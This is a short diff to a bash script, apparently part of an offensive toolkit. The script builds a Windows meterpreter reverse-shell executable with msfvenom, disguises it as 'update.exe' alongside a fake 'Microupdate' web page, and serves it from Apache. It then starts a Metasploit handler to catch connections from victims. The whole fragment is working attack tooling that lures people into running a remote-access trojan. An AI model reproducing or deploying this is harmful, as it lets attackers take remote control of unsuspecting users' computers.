@@ -49,8 +49,9 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then                    
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > /root/Desktop/update.exe
-	mv /root/Desktop/update.exe /var/www/html
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > update.exe
+	mv update.exe /var/www/html
+	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
